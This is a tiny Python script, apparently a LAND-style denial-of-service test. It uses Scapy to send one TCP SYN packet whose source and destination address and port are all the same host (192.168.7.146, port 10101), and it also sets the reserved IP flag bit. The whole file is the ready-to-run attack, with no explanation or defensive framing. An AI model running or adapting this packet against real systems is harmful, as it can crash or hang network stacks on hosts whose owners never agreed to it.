#!/usr/bin/python
from scapy.all import *

ip = IP(src="192.168.7.146", dst="192.168.7.146", flags=4, frag=0)
tcpsyn = TCP(sport=10101, dport=10101, flags="S", seq=10101)
send(ip / tcpsyn)
